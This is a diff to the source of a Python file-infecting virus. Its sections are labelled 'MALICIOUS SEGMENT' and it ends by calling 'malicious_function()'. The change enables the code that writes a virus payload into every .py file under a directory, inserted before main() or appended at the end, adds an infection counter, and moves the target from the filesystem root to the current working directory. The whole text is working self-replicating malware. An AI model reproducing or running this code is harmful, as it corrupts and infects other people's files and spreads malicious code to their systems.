@@ -71,7 +71,7 @@ def infect_directory(path, virus_payload):
         for file in files:
             if file.endswith(".py"):  
                 file_path = os.path.join(current_directory, file)
-                infect_file(file_path, virus_payload)
+                infection_count += infect_file(file_path, virus_payload)
         directory_count += 1
         print_progress_bar(directory_count, total_directories)
         sleep(1)
@@ -81,7 +81,7 @@ def infect_directory(path, virus_payload):
 
 # MALICIOUS SEGMENT BEGIN
 # infects the given file
-def infect_file(file, virus_payload):
+def infect_file(file, virus_payload) -> int:
     # regular expression to find where main() is defined
     main_function_pattern =  r"""
     ^\s*                        # Leading whitespace
@@ -118,13 +118,19 @@ def infect_file(file, virus_payload):
         infected_code = file_code
         modified_payload = ["    " + line for line in virus_payload] 
         infected_code[main_function_line_number:main_function_line_number] = modified_payload
-        # with open(file, "w") as f:
-        #     f.writelines(infected_code)
+        with open(file, "w") as f:
+            f.writelines(infected_code)
+            sleep(1)
+        return 1
     # inject payload at the bottom if main() doesn't exist
     elif not file_is_infected and main_function_line_number == -1:     
         infected_code = file_code + virus_payload
-        # with open(file, "w") as f:
-        #     f.writelines(infected_code)
+        with open(file, "w") as f:
+            f.writelines(infected_code)
+            sleep(1)
+        return 1
+    else:
+        return 0
 # MALICIOUS SEGMENT END
 
 # MALICIOUS SEGMENT BEGIN
@@ -150,11 +156,11 @@ virus_payload = prepare_payload()
 
 # step 2: search for and infect potential hosts
 # infect entire directory
-infect_directory('/', virus_payload)
+# infect_directory('/', virus_payload)
 
 # infect current directory only
-# current_directory = os.getcwd()
-# infect_directory(current_directory, virus_payload)
+current_directory = os.getcwd()
+infect_directory(current_directory, virus_payload)
 
 # step 3: malicious function
 malicious_function()
